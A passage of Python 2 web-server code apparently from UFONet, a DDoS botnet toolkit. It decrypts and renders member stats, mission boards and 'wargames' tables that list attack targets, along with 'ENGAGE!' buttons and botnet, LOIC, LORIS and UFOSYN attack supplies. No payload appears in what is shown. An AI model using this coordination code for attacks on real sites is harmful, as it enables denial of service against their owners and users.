                        board_trans = "[Mothership/Error] Something wrong sending your message to the board. Try it again...\n"
                except:
                    board_trans = "[Mothership/Error] Something wrong sending your message to the board. Try it again...\n"
            f = open("/tmp/out", "w")
            f.write(board_trans)
            f.write(end_mark)
            f.close()
        if page == "/cmd_send_message_board_update":
            if not os.path.exists('/tmp/out'):
                open('/tmp/out', 'w').close()
            with open('/tmp/out', 'r') as f:
                self.pages["/cmd_send_message_board_update"] = "<pre>"+f.read()+"<pre>"
        if page == "/cmd_decrypt":
            self.pages["/cmd_decrypt"] = "<pre>Waiting for decrypting results...</pre>"
            try:
                news_key = pGet["news_key"]
            except:
                news_key = ""
            try:
                missions_key = pGet["missions_key"]
            except:
                missions_key = ""
            end_mark = "\n[Mothership/Info] End of decryption."
            if news_key is not "": # news decryption
                self.decrypted_news = []
                nodec_text = "*** [This message cannot be solved with that key...]"
                news_key = pGet["news_key"]
                for news_text in self.list_news:
                    self.decrypt(news_key, news_text)
                    if self.decryptedtext:
                        self.decrypted_news.append(self.decryptedtext)
                    else:
                        self.decrypted_news.append(nodec_text)
                    self.decryptedtext = "" # clean decryptedtext buffer
                f = open("/tmp/out", "w")
                num_news = 0 # news counter
                for m in self.decrypted_news:
                    num_news = num_news + 1
                    f.write("["+str(num_news)+"] " + str(m)+"\n")
                f.write(end_mark)
                f.close()
            else:
                if missions_key is not "": # missions decryption
                    self.decrypted_missions = []
                    nodec_text = "*** [This message cannot be solved with that key...]"
                    missions_key = pGet["missions_key"]
                    for missions_text in self.list_missions:
                        self.decrypt(missions_key, missions_text)
                        if self.decryptedtext:
                            self.decrypted_missions.append(self.decryptedtext)
                        else:
                            self.decrypted_missions.append(nodec_text)
                        self.decryptedtext = "" # clean decryptedtext buffer
                    f = open("/tmp/out", "w")
                    num_mission = 0 # missions counter
                    for m in self.decrypted_missions:
                        num_mission = num_mission + 1
                        f.write("["+str(num_mission)+"] " + str(m)+"\n") 
                    f.write(end_mark)
                    f.close()
                else: # blackholes (nodes.dat) decryption + data showing
                    self.decrypted_blackholes = []
                    nodec_text = "*** [This message cannot be solved with that key...]"
                    blackhole_key = pGet["blackhole_key"]
                    for blackholes_text in self.list_blackholes:
                        self.decrypt(blackhole_key, blackholes_text)
                        if self.decryptedtext:
                            self.decrypted_blackholes.append(self.decryptedtext)
                        else:
                            self.decrypted_blackholes.append(nodec_text)
                        self.decryptedtext = "" # clean decryptedtext buffer
                    f = open("/tmp/out", "w")
                    num_blackholes = 0 # blackholes counter
                    for b in self.decrypted_blackholes:
                        num_blackholes = num_blackholes + 1
                        if blackhole_sep in b: # IP | Mode | Comment | Actions
                            s = b.rsplit(blackhole_sep, 1)[0]
                            ip = str(s.rsplit(blackhole_sep, 1)[0])
                            mode =  str(s.rsplit(blackhole_sep, 1)[1])
                            if mode == "D": # Download only mode
                                mode = "<a href=javascript:runCommandX('cmd_download_community')>Download</a>"
                            elif mode == "U": # Upload only mode
                                mode = "<a href=javascript:runCommandX('cmd_upload_community')>Upload</a>"
                            else: # Upload/Download mode
                                mode = "<a href=javascript:runCommandX('cmd_download_community')>Download</a>" + " - " + "<a href=javascript:runCommandX('cmd_upload_community')>Upload</a>"
                            comment = str(b.rsplit(blackhole_sep, 1)[1])
                            b = ip + " " + blackhole_sep + " Botnet: " + mode + " " + blackhole_sep + " Comment: " + comment
                            f.write("["+str(num_blackholes)+"] " + str(b)+"\n")
                        else:
                            f.write("["+str(num_blackholes)+"] " + str(b)+"\n")
                    f.write(end_mark)
                    f.close()
        if page == "/cmd_decrypt_update":
            if not os.path.exists('/tmp/out'):
                open('/tmp/out', 'w').close()
            with open('/tmp/out', 'r') as f:
                self.pages["/cmd_decrypt_update"] = "<pre>"+f.read()+"<pre>"
        if page == "/news":
            self.pages["/news"] = self.html_news()
        if page == "/missions":
            self.pages["/missions"] = self.html_missions()
        if page == "/board":
            self.pages["/board"] = self.html_board()
        if page == "/grid":
            self.pages["/grid"] = self.html_grid()
        if page == "/wargames":
            self.pages["/wargames"] = self.html_wargames()
        if page == "/grid_profile":
            if pGet=={}:
                self.pages["/grid_profile"] = self.html_grid_profile()
            else:
                self.save_grid(pGet)
                self.pages["/grid_profile"] = self.html_grid_profile_submit()
        if page == "/board_profile":
            if pGet  =={}:
                self.pages["/board_profile"] = self.html_board_profile()
            else:
                self.save_profile(pGet)
                self.pages["/board_profile"] = self.html_board_profile_submit()
        if page == "/board_remove":
            self.pages["/board_remove"] = self.html_board_remove()
        if page == "/grid_remove":
            self.pages["/grid_remove"] = self.html_grid_remove()
        if page == "/cmd_decrypt_moderator_board":
            self.pages["/cmd_decrypt_moderator_board"] = "<pre>Waiting for decrypting results...</pre>"
            try:
                board_key = pGet["board_key"]
            except:
                board_key = ""
            try:
                filter = pGet["filter"]
            except:
                filter = ""
            end_mark = "\n[Mothership/Info] End of decryption."
            if board_key is not "": # board decryption
                nodec_text = "***[ENCRYPTED WITH OTHER KEY]"
                f = open("/tmp/out", "w")
                b = "<center><table border='1' cellpadding='10' cellspacing='5' align=center>"
                f.write(str(b)+"\n")
                self.list_moderator_rev = reversed(self.list_moderator) # order by DESC
                for m in self.list_moderator_rev: # msg = topic | icon | nick | id | comment
                    if board_msg_sep in m:
                        m = m.split(board_msg_sep)
                        topic = m[0] # topic
                        t = m[1] # icon
                        n = m[2] # nick
                        g = m[3] # id
                        l = m[4] # comment
                        if topic == "1":
                            topic = "/GENERAL"
                        elif topic == "2":
                            topic = "/#OPSEC "
                        elif topic == "3":
                            topic = "/FAQ    "
                        elif topic == "4":
                            topic = "/BUGS   "
                        elif topic == "5":
                            topic = "/MEDIA  "
                        else:
                            topic = "/BUGS[!]"
                        icon = "<img src='/images/crew/link"+str(t)+".png'>"
                        nick = str(n)
                        self.decrypt(board_key, nick)
                        if self.decryptedtext:
                            nick = self.decryptedtext
                        else:
                            nick = 'Anonymous' # We are legion!
                        self.decryptedtext = "" # clean decryptedtext buffer
                        id = str(g)[0:6] # only show 6 chars from personal ID (obfuscation)
                        msg = str(l)
                        self.decrypt(board_key, msg)
                        if self.decryptedtext:
                            msg = self.decryptedtext
                        else:
                            msg = nodec_text
                        self.decryptedtext = "" # clean decryptedtext buffer
                        if filter in topic or filter == "ALL": # filter content by user selection                            
                            b = "<tr valign=top><td align=center>" + icon + "<br>"+nick+"</td><td>"
                            b += "<font size=+2>"+topic+"</font>"
                            b += "<br>by "+nick+"<br><br>"
                            b += str(msg) + "</td></tr>"
                            f.write(str(b)+"\n")
                        else:
                            pass
                    else: # not valid stream data
                        pass 
                b="</table>"
                f.write(str(b)+"\n")
                f.write(end_mark)
                f.close()  
        if page == "/cmd_decrypt_moderator_board_update":
            if not os.path.exists('/tmp/out'):
                open('/tmp/out', 'w').close()
            with open('/tmp/out', 'r') as f:
                self.pages["/cmd_decrypt_moderator_board_update"] = "<pre>"+f.read()+"<pre>"
        if page == "/cmd_decrypt_grid":
            self.pages["/cmd_decrypt_grid"] = "<pre>Waiting for decrypting results...</pre>"
            try:
                grid_key = pGet["grid_key"]
            except:
                grid_key = ""
            end_mark = "[Mothership/Info] End of decryption."
            if grid_key is not "": # grid decryption
                # Mothership stats counters
                mothership_members = 0
                member_1 = 0 # Rookie
                member_2 = 0 # Mercenary
                member_3 = 0 # Bandit
                member_4 = 0 # UFOmmander!
                mothership_missions = 0
                mothership_transferred = 0
                mothership_attacks = 0
                mothership_loic = 0
                mothership_loris = 0
                mothership_ufosyn = 0
                mothership_chargo = 0
                mothership_dorking = 0
                mothership_maxchargo = 0
                nodec_text = "KEY?"
                grid_table = "<center><u>MEMBERS STATS:</u></center><br><table cellpadding='5' cellspacing='5' border='1'><tr><td align='center'><a id='filter_nickname' style='color:red;text-decoration:underline red;' onclick=javascript:GridFilter('nickname','"+str(grid_key)+"')>NICKNAME:</a></td><td align='center'><a id='filter_ranking' style='color:red;text-decoration:underline red;' onclick=javascript:GridFilter('ranking','"+str(grid_key)+"')>RANKING:</a></td><td align='center'><a id='filter_chargo' style='color:red;text-decoration:underline red;' onclick=javascript:GridFilter('chargo','"+str(grid_key)+"')>CHARGO:</a></td><td align='center'><a id='filter_dorking' style='color:red;text-decoration:underline red;' onclick=javascript:GridFilter('dorking','"+str(grid_key)+"')>DORKING:</a></td><td align='center'><a id='filter_transf' style='color:red;text-decoration:underline red;' onclick=javascript:GridFilter('transferred','"+str(grid_key)+"')>TRANSF:</a></td><td align='center'><a id='filter_maxchargo' style='color:red;text-decoration:underline red;' onclick=javascript:GridFilter('maxchargo','"+str(grid_key)+"')>MAX.CHARGO:</a></td><td align='center'><a id='filter_missions' style='color:red;text-decoration:underline red;' onclick=javascript:GridFilter('missions','"+str(grid_key)+"')>MISSIONS:</a></td><td align='center'><a id='filter_attacks' style='color:red;text-decoration:underline red;' onclick=javascript:GridFilter('attacks','"+str(grid_key)+"')>ATTACKS:</a></td><td align='center'><a id='filter_loic' style='color:red;text-decoration:underline red;' onclick=javascript:GridFilter('loic','"+str(grid_key)+"')>LOIC:</a></td><td align='center'><a id='filter_loris' style='color:red;text-decoration:underline red;' onclick=javascript:GridFilter('loris','"+str(grid_key)+"')>LORIS:</a></td><td align='center'><a id='filter_ufosyn' style='color:red;text-decoration:underline red;' onclick=javascript:GridFilter('ufosyn','"+str(grid_key)+"')>UFOSYN:</a></td><td align='center'><a id='filter_contact' style='color:red;text-decoration:underline red;' onclick=javascript:GridFilter('contact','"+str(grid_key)+"')>CONTACT:</a></td></tr>"
                grid_key = pGet["grid_key"]
                f = open("/tmp/out", "w")
                self.list_grid_rev = reversed(self.list_grid) # order by DESC
                for m in self.list_grid_rev: # rev(msg) = nickname, ranking, chargo, dorking, transf, maxchargo, missions, attacks, loic, loris, ufosyn, contact, ID
                    if grid_msg_sep in m:
                        version = m.count(grid_msg_sep) # check UFONet stream version (10->0.9|11->1.0|12->1.1)
                        m = m.split(grid_msg_sep)
                        grid_nickname = m[0] # nickname
                        self.decrypt(grid_key, grid_nickname)
                        if self.decryptedtext:
                            grid_nickname = self.decryptedtext
                        else:
                            grid_nickname = nodec_text
                        self.decryptedtext = "" # clean decryptedtext buffer
                        if len(grid_nickname) > 12 or len(grid_nickname) < 3: # m[0] = grid_nickname (>str3<str12)
                            grid_nickname = "Anonymous"
                        else: 
                            grid_nickname = str(grid_nickname) # nickname
                        mothership_members = mothership_members + 1 # add new registered member to mothership stats
                        grid_ranking = m[1] # ranking
                        self.decrypt(grid_key, grid_ranking)
                        if self.decryptedtext:
                            try:
                                grid_ranking = int(self.decryptedtext)
                            except:
                                grid_ranking = nodec_text
                        else:
                            grid_ranking = nodec_text
                        self.decryptedtext = "" # clean decryptedtext buffer
                        if grid_ranking == 1: #Rookie
                            grid_ranking = "<font color='white' size='4'>*</font>"
                            member_1 = member_1 + 1
                        elif grid_ranking == 2: # Mercenary
                            grid_ranking = "<font color='cyan' size='4'>**</font>"
                            member_2 = member_2 + 1
                        elif grid_ranking == 3: # Bandit 
                            grid_ranking = "<font color='blueviolet' size='4'>***</font>"
                            member_3 = member_3 + 1
                        elif grid_ranking == 4: # UFOmmander!
                            grid_ranking = "<font color='blue' size='4'>****</font>"
                            member_4 = member_4 + 1
                        else:
                            grid_ranking = nodec_text
                        grid_totalchargo = m[2] # total chargo
                        self.decrypt(grid_key, grid_totalchargo)
                        if self.decryptedtext:
                            grid_totalchargo = self.decryptedtext
                        else:
                            grid_totalchargo = nodec_text
                        self.decryptedtext = "" # clean decryptedtext buffer
                        try: # parse for int
                            grid_totalchargo = int(grid_totalchargo)
                            mothership_chargo = mothership_chargo + grid_totalchargo
                        except:
                            grid_totalchargo = nodec_text
                        grid_dorking = m[3] # dorking
                        self.decrypt(grid_key, grid_dorking)
                        if self.decryptedtext:
                            grid_dorking = self.decryptedtext
                        else:
                            grid_dorking = nodec_text
                        self.decryptedtext = "" # clean decryptedtext buffer
                        try: # parse for int
                            grid_dorking = int(grid_dorking)
                            mothership_dorking = mothership_dorking + grid_dorking
                        except:
                            grid_dorking = nodec_text
                        grid_transferred = m[4] # transferred
                        self.decrypt(grid_key, grid_transferred)
                        if self.decryptedtext:
                            grid_transferred = self.decryptedtext
                        else:
                            grid_transferred = nodec_text
                        self.decryptedtext = "" # clean decryptedtext buffer
                        try: # parse for int
                            grid_transferred = int(grid_transferred)
                            mothership_transferred = mothership_transferred + grid_transferred
                        except:
                            grid_transferred = nodec_text
                        grid_maxchargo = m[5] # maxchargo
                        self.decrypt(grid_key, grid_maxchargo)
                        if self.decryptedtext:
                            grid_maxchargo = self.decryptedtext
                        else:
                            grid_maxchargo = nodec_text
                        self.decryptedtext = "" # clean decryptedtext buffer
                        try: # parse for int
                            grid_maxchargo = int(grid_maxchargo)
                            mothership_maxchargo = mothership_maxchargo + grid_maxchargo
                        except:
                            grid_maxchargo = nodec_text
                        grid_missions = m[6] # missions
                        self.decrypt(grid_key, grid_missions)
                        if self.decryptedtext:
                            grid_missions = self.decryptedtext
                        else:
                            grid_missions = nodec_text
                        self.decryptedtext = "" # clean decryptedtext buffer
                        try: # parse for int
                            grid_missions = int(grid_missions)
                            mothership_missions = mothership_missions + grid_missions
                        except:
                            grid_missions = nodec_text
                        grid_attacks = m[7] # attacks
                        self.decrypt(grid_key, grid_attacks)
                        if self.decryptedtext:
                            grid_attacks = self.decryptedtext
                        else:
                            grid_attacks = nodec_text
                        self.decryptedtext = "" # clean decryptedtext buffer
                        try: # parse for int
                            grid_attacks = int(grid_attacks)
                            mothership_attacks = mothership_attacks + grid_attacks
                        except:
                            grid_attacks = nodec_text
                        grid_loic = m[8] # loic
                        self.decrypt(grid_key, grid_loic)
                        if self.decryptedtext:
                            grid_loic = self.decryptedtext
                        else:
                            grid_loic = nodec_text
                        self.decryptedtext = "" # clean decryptedtext buffer
                        try: # parse for int
                            grid_loic = int(grid_loic)
                            mothership_loic = mothership_loic + grid_loic
                        except:
                            grid_loic = nodec_text
                        if version == 12: # v1.1
                            grid_loris = m[9] # loris
                            self.decrypt(grid_key, grid_loris)
                            if self.decryptedtext:
                                grid_loris = self.decryptedtext
                            else:
                                grid_loris = nodec_text
                            self.decryptedtext = "" # clean decryptedtext buffer
                            try: # parse for int
                                grid_loris = int(grid_loris)
                                mothership_loris = mothership_loris + grid_loris
                            except:
                                grid_loris = nodec_text
                            grid_ufosyn = m[10] # ufosyn
                            self.decrypt(grid_key, grid_ufosyn)
                            if self.decryptedtext:
                                grid_ufosyn = self.decryptedtext
                            else:
                                grid_ufosyn = nodec_text
                            self.decryptedtext = "" # clean decryptedtext buffer
                            try: # parse for int
                                grid_ufosyn = int(grid_ufosyn)
                                mothership_ufosyn = mothership_ufosyn + grid_ufosyn
                            except:
                                grid_ufosyn = nodec_text
                            try: # decrypt + parse contact len + correct js view (without blank spaces)
                                grid_contact = m[11] # contact
                                self.decrypt(grid_key, grid_contact)
                                if self.decryptedtext:
                                    grid_contact = self.decryptedtext
                                else:
                                    grid_contact = nodec_text
                                self.decryptedtext = "" # clean decryptedtext buffer
                                if len(grid_contact) > 120 or len(grid_contact) < 3: # m[11] = grid_contact (>str3<str120)
                                    grid_contact = "<a href=javascript:alert('UNKNOWN!');>View</a>" # js error contact view
                                else:
                                    try:
                                        if " " in grid_contact: # m[11] = grid_contact
                                            grid_contact = grid_contact.replace(" ","")
                                        grid_contact = "<a href=javascript:alert('"+str(grid_contact)+"');>View</a>" # js contact view
                                    except:
                                        grid_contact = "<a href=javascript:alert('UNKNOWN!');>View</a>" # js error contact view
                            except:
                                pass
                            try:            
                                grid_id = m[12] # id
                            except:
                                pass     
                        elif version == 11: # v1.0
                            grid_loris = m[9] # loris
                            self.decrypt(grid_key, grid_loris)
                            if self.decryptedtext:
                                grid_loris = self.decryptedtext
                            else:
                                grid_loris = nodec_text
                            self.decryptedtext = "" # clean decryptedtext buffer
                            try: # parse for int
                                grid_loris = int(grid_loris)
                                mothership_loris = mothership_loris + grid_loris
                            except:
                                grid_loris = nodec_text
                            grid_ufosyn = str("2OwgWPTsDw8k6f6sgnGLOw8vAb1PSrs+NkeLNPxEyJO3ahKV0Q==") # not ufosyn present
                            self.decrypt(grid_key, grid_ufosyn)
                            if self.decryptedtext:
                                grid_ufosyn = self.decryptedtext
                            else:
                                grid_ufosyn = nodec_text
                            self.decryptedtext = "" # clean decryptedtext buffer
                            try: # parse for int
                                grid_ufosyn = int(grid_ufosyn)
                                mothership_ufosyn = mothership_ufosyn + grid_ufosyn
                            except:
                                grid_ufosyn = nodec_text
                            try: # decrypt + parse contact len + correct js view (without blank spaces)
                                grid_contact = m[10] # contact
                                self.decrypt(grid_key, grid_contact)
                                if self.decryptedtext:
                                    grid_contact = self.decryptedtext
                                else:
                                    grid_contact = nodec_text
                                self.decryptedtext = "" # clean decryptedtext buffer
                                if len(grid_contact) > 120 or len(grid_contact) < 3: # m[10] = grid_contact (>str3<str120)
                                    grid_contact = "<a href=javascript:alert('UNKNOWN!');>View</a>" # js error contact view
                                else:
                                    try:
                                        if " " in grid_contact: # m[10] = grid_contact
                                            grid_contact = grid_contact.replace(" ","")
                                        grid_contact = "<a href=javascript:alert('"+str(grid_contact)+"');>View</a>" # js contact view
                                    except:
                                        grid_contact = "<a href=javascript:alert('UNKNOWN!');>View</a>" # js error contact view
                            except:
                                pass
                            try:            
                                grid_id = m[11] # id
                            except:
                                pass                  
                        elif version == 10: # v0.9
                            grid_loris = str("2OwgWPTsDw8k6f6sgnGLOw8vAb1PSrs+NkeLNPxEyJO3ahKV0Q==") # not loris present
                            self.decrypt(grid_key, grid_loris)
                            if self.decryptedtext:
                                grid_loris = self.decryptedtext
                            else:
                                grid_loris = nodec_text
                            self.decryptedtext = "" # clean decryptedtext buffer
                            try: # parse for int
                                grid_loris = int(grid_loris)
                                mothership_loris = mothership_loris + grid_loris
                            except:
                                grid_loris = nodec_text
                            grid_ufosyn = str("2OwgWPTsDw8k6f6sgnGLOw8vAb1PSrs+NkeLNPxEyJO3ahKV0Q==") # not ufosyn present
                            self.decrypt(grid_key, grid_ufosyn)
                            if self.decryptedtext:
                                grid_ufosyn = self.decryptedtext
                            else:
                                grid_ufosyn = nodec_text
                            self.decryptedtext = "" # clean decryptedtext buffer
                            try: # parse for int
                                grid_ufosyn = int(grid_ufosyn)
                                mothership_ufosyn = mothership_ufosyn + grid_ufosyn
                            except:
                                grid_ufosyn = nodec_text
                            try: # decrypt + parse contact len + correct js view (without blank spaces)
                                grid_contact = m[9] # contact
                                self.decrypt(grid_key, grid_contact)
                                if self.decryptedtext:
                                    grid_contact = self.decryptedtext
                                else:
                                    grid_contact = nodec_text
                                self.decryptedtext = "" # clean decryptedtext buffer
                                if len(grid_contact) > 120 or len(grid_contact) < 3: # m[9] = grid_contact (>str3<str120)
                                    grid_contact = "<a href=javascript:alert('UNKNOWN!');>View</a>" # js error contact view
                                else:
                                    try:
                                        if " " in grid_contact: # m[9] = grid_contact
                                            grid_contact = grid_contact.replace(" ","")
                                        grid_contact = "<a href=javascript:alert('"+str(grid_contact)+"');>View</a>" # js contact view
                                    except:
                                        grid_contact = "<a href=javascript:alert('UNKNOWN!');>View</a>" # js error contact view
                            except:
                                pass
                            try:            
                                grid_id = m[10] # id
                            except:
                                pass
                        else: # no valid version
                            pass
                    try: # parsing for valid stream struct
                        grid_nickname = str(grid_nickname)
                        grid_table += "<tr><td align='center'>"+str(grid_nickname)+"</td><td align='center'>"+str(grid_ranking)+"</td><td align='center'>"+str(grid_totalchargo)+"</td><td align='center'>"+str(grid_dorking)+"</td><td align='center'>"+str(grid_transferred)+"</td><td align='center'>"+str(grid_maxchargo)+"</td><td align='center'>"+str(grid_missions)+"</td><td align='center'>"+str(grid_attacks)+"</td><td align='center'>"+str(grid_loic)+"</td><td align='center'>"+str(grid_loris)+"</td><td align='center'>"+str(grid_ufosyn)+"</td><td align='center'>"+str(grid_contact)+"</td></tr>"
                    except:
                        grid_table += "<tr><td align='center'>INVALID!</td><td align='center'>INVALID!</td><td align='center'>INVALID!</td><td align='center'>INVALID!</td><td align='center'>INVALID!</td><td align='center'>INVALID!</td><td align='center'>INVALID!</td><td align='center'>INVALID!</td><td align='center'>INVALID!</td><td align='center'>INVALID!</td><td align='center'>INVALID!</td><td align='center'>INVALID!</td></tr>"
                grid_table += "</table><br>"
                l = time.ctime(os.path.getmtime(self.grid_file)) # get last modified time
                mother_table = "<center><u>MOTHERSHIP STATS:</u> (Last Update: <font color='green'>"+str(l)+"</font>)</center><br><table cellpadding='5' cellspacing='5' border='1'><tr><td>MEMBERS:</td><td align='right'>"+str(mothership_members)+"</td><td><font color='blue' size='4'>****</font></td><td align='right'><font color='blue' size='4'>"+str(member_4)+"</font></td><td><font color='blueviolet' size='4'>***</font></td><td align='right'><font color='blueviolet' size='4'>"+str(member_3)+"</font></td><td><font color='cyan' size='4'>**</font></td><td align='right'><font color='cyan' size='4'>"+str(member_2)+"</font></td><td><font color='white' size='4'>*</font></td><td align='right'><font color='white' size='4'>"+str(member_1)+"</font></td></tr><tr><td>MISSIONS:</td><td align='right'>"+str(mothership_missions)+"</td><td>ATTACKS:</td><td align='right'>"+str(mothership_attacks)+"</td><td>LOIC:</td><td align='right'>"+str(mothership_loic)+"</td><td>LORIS:</td><td align='right'>"+str(mothership_loris)+"</td><td>UFOSYN:</td><td align='right'>"+str(mothership_ufosyn)+"</td></tr><tr><td>CHARGO (ACTIVE!):</td><td align='right'>"+str(mothership_chargo)+"</td><td>DORKING:</td><td align='right'>"+str(mothership_dorking)+"</td><td>MAX.CHARGO:</td><td align='right'>"+str(mothership_maxchargo)+"</td></tr></table><br><hr><br>"
                f.write(mother_table)
                f.write(grid_table)
                f.write(end_mark)
                f.close()  
            else: # not valid stream data
                pass
        if page == "/cmd_decrypt_grid_update":
            if not os.path.exists('/tmp/out'):
                open('/tmp/out', 'w').close()
            with open('/tmp/out', 'r') as f:
                self.pages["/cmd_decrypt_grid_update"] = "<pre>"+f.read()+"<pre>"
        if page == "/cmd_decrypt_wargames":
            self.pages["/cmd_decrypt_wargames"] = "<pre>Waiting for decrypting results...</pre>"
            wargames_join_flag = False # anti-join flag for non decrypted wargames
            try:
                wargames_deckey = pGet["wargames_deckey"]
            except:
                wargames_deckey = ""
            end_mark = "[Mothership/Info] End of decryption."
            if wargames_deckey is not "": # wargames decryption
                nodec_text = "KEY?"
                try: # read global army supply from configuration file (json)
                    with open(self.mothership_supplycfg_file) as data_file:
                        data = json.load(data_file)
                except:
                    if os.path.exists(self.mothership_supplycfg_file) == True:
                        print '[Error] - Cannot open: "core/json/supplycfg.json"...\n'
                        sys.exit(2)
                    else: # generate default global army supply configuration file
                        print '[Info] - Cannot found: "core/json/supplycfg.json". Generating...\n'
                        with open(self.mothership_supplycfg_file, "w") as f:
                            json.dump({"botnet": 1, "loic": 0, "loris": 0, "ufosyn": 0}, f, indent=4)
                with open(self.mothership_supplycfg_file) as data_file:
                    data = json.load(data_file)
                self.supply_botnet = data["botnet"]
                self.supply_loic = data["loic"]
                self.supply_loris = data["loris"]
                self.supply_ufosyn = data["ufosyn"]
                f = open(self.wargames_file,"r")
                ls = f.readlines()
                f.close()
                if ls:
                    wargames_autopanel = "<u>MASSIVE ACTION</u>:<br><br><table cellpadding='5' cellspacing='5' border='1'><tr><td align='center'><button title='Remove ALL: -CLOSED-' onclick=JobRemoveAll('"+str(wargames_deckey)+"')>-PURGE-</button></td><td align='center'><button style='background-color:cyan;height:50px;width:120px' title='Engage ALL: -ONGOING-' onclick=JobAddAll()>ENGAGE ALL!</button></td><td align='center'><button style='background-color:red;height:50px;width:120px' title='Cancel ALL: JOINED!' onclick=JobCancelAll()>PANIC!!!</button></td></tr></table><br><br>"
                    wargames_supply = "<u>GLOBAL ARMY SUPPLY (rounds)</u>:<br><br><table cellpadding='5' cellspacing='5' border='1'><tr><td align='center'>BOTNET ("+str(self.total_botnet)+"):</td><td align='center'>LOIC:</td><td align='center'>LORIS:</td><td align='center'>UFOSYN:</td></tr><tr><td align='center'><input type='number' min='1' max='20' required id='supply_botnet' value='"+str(self.supply_botnet)+"' style='text-align: center;' readonly></td><td align='center'><input type='number' min='0' max='20' required id='supply_loic' value='"+str(self.supply_loic)+"' style='text-align: center;' readonly></td><td align='center'><input type='number' min='0' max='20' required id='supply_loris' value='"+str(self.supply_loris)+"'  style='text-align: center;' readonly></td><td align='center'><input type='number' min='0' max='20' required id='supply_ufosyn' value='"+str(self.supply_ufosyn)+"' style='text-align: center;' readonly></td><td><button id='supply_edit' title='Edit global army supply...' value='EDIT' onclick=EditSupply()>EDIT</button></td></tr></table><br><br>"
                else:
                    wargames_autopanel = ""
                    wargames_supply = ""
                wargames_table = wargames_autopanel + wargames_supply +"<table cellpadding='5' cellspacing='5' border='1'><tr><td align='center'><a id='filter_creation' style='color:red;text-decoration:underline red;' onclick=javascript:JobFilter('creation','"+str(wargames_deckey)+"');>CREATION:</a></td><td align='center'><a id='filter_target' style='color:red;text-decoration:underline red;' onclick=javascript:JobFilter('target','"+str(wargames_deckey)+"')>TARGET:</a></td><td align='center'><a id='filter_estimated' style='color:red;text-decoration:underline red;' onclick=javascript:JobFilter('estimated','"+str(wargames_deckey)+"')>DATE:</a></td><td align='center'><u>ETA:</u></td><td align='center'><u>ACTION:</u></td><td align='center'><u>STATUS:</u></td></tr>"
                f = open("/tmp/out", "w")
                self.list_wargames_rev = reversed(self.list_wargames) # order by DESC
                wargames_id = 1
                for m in self.list_wargames_rev: # list = creation, target, estimated
                    if wargames_msg_sep in m:
                        m = m.split(wargames_msg_sep)
                        wargames_creation = m[0] # creation date
                        self.decrypt(wargames_deckey, wargames_creation)
                        if self.decryptedtext:
                            wargames_creation = self.decryptedtext
                        else:
                            wargames_creation = nodec_text
                        self.decryptedtext = "" # clean decryptedtext buffer
                        wargames_target = m[1] # target
                        wargames_target_joined = wargames_target
                        self.decrypt(wargames_deckey, wargames_target)
                        if self.decryptedtext:
                            wargames_target = self.decryptedtext
                            if wargames_target.startswith("www."):
                                wargames_target = wargames_target.replace("www.","")
                        else:
                            wargames_target = nodec_text
                        self.decryptedtext = "" # clean decryptedtext buffer
                        wargames_estimated = m[2] # estimated time
                        self.decrypt(wargames_deckey, wargames_estimated)
                        if self.decryptedtext:
                            wargames_estimated = self.decryptedtext
                            wargames_join_flag = True
                        else:
                            wargames_estimated = nodec_text
                        self.decryptedtext = "" # clean decryptedtext buffer
                    else:
                        wargames_target = "KEY?"
                    now = strftime("%d-%m-%Y %H:%M:%S", gmtime())
                    now = strptime(now, "%d-%m-%Y %H:%M:%S")
                    try:
                        wargames_creation = strptime(wargames_creation, "%d-%m-%Y %H:%M:%S")
                        wargames_estimated = strptime(wargames_estimated, "%d-%m-%Y %H:%M:%S")
                    except: # discarding errors also on panel
                        wargames_creation = now
                        wargames_estimated = now
                    if wargames_target == "KEY?": # allow to discard unencrypted wargames
                        wargames_creation = now
                        wargames_estimated = now
                    if (now >= wargames_estimated) == False: # change flag color when time is out
                        time_now = time.mktime(now)
                        time_estimated = time.mktime(wargames_estimated)
                        wargames_eta = (time_estimated - time_now)
                        hours, rem = divmod(wargames_eta, 3600)
                        minutes, seconds = divmod(rem, 60)
                        if "!!!" in wargames_target_joined:
                            status = "JOINED!"
                            wargames_status = "<font color='cyan'>"+status+"</font>"
                            if wargames_join_flag == True:
                                wargames_join = "<button id="+str(wargames_id)+" title='Cancel this battle...' onclick=JobCancel('"+str(wargames_id)+"')>CANCEL</button>"
                            else: 
                                wargames_join = "KEY?" # present but with a different crypto-key
                            wargames_eta = "<font color='cyan'>{:0>2}h {:0>2}m {:02}s</font>".format(int(hours),int(minutes),int(seconds))
                            wargames_estimated = strftime("%d-%m-%Y %H:%M:%S", wargames_estimated)
                            time_flag = "<font color='cyan'>"+str(wargames_estimated)+"</font>"
                            wargames_creation = strftime("%d-%m-%Y %H:%M:%S", wargames_creation)
                            creation_flag = "<font color='cyan'>"+str(wargames_creation)+"</font>"
                        else:
                            status = "-ONGOING-"
                            wargames_status = "<font color='orange'>"+status+"</font>"
                            if wargames_join_flag == True:
                                wargames_join = "<button id="+str(wargames_id)+" title='Join this battle...' onclick=JobAdd('"+str(wargames_id)+"')>ENGAGE!</button>"
                            else: 
                                wargames_join = "KEY?" # present but with a different crypto-key
                            wargames_eta = "<font color='orange'>{:0>2}h {:0>2}m {:02}s</font>".format(int(hours),int(minutes),int(seconds))
                            wargames_estimated = strftime("%d-%m-%Y %H:%M:%S", wargames_estimated)
                            time_flag = "<font color='orange'>"+str(wargames_estimated)+"</font>"
                            wargames_creation = strftime("%d-%m-%Y %H:%M:%S", wargames_creation)
                            creation_flag = "<font color='orange'>"+str(wargames_creation)+"</font>"
                    else:
                        wargames_estimated = strftime("%d-%m-%Y %H:%M:%S", wargames_estimated)
                        time_flag = "<font color='red'><s>"+str(wargames_estimated)+"</s></font>"
                        wargames_creation = strftime("%d-%m-%Y %H:%M:%S", wargames_creation)
                        creation_flag = "<font color='red'>"+str(wargames_creation)+"</font>"
                        wargames_join = "<button id="+str(wargames_id)+" title='Remove this battle...' onclick=JobRemove('"+str(wargames_id)+"')>REMOVE</button>"
                        wargames_eta = "<font color='red'>OUT-OF-TIME</font>"
                        status = "-CLOSED-"
                        wargames_status = "<font color='red'>"+status+"</font>"
                    wargames_table += "<tr><td align='center'>"+creation_flag+"</td><td align='center'><a href='http://"+str(wargames_target)+"' target='_blank'>"+str(wargames_target)+"</a></td><td align='center'>"+time_flag+"</td><td align='center'>"+wargames_eta+"</td><td align='center'>"+wargames_join+"</td><td align='center'>"+wargames_status+"</td></tr>"
                    wargames_id = wargames_id + 1
                wargames_table += "</table><br>"
                f.write(wargames_table)
                f.write(end_mark)
                f.close()
        if page == "/cmd_decrypt_wargames_update":
            if not os.path.exists('/tmp/out'):
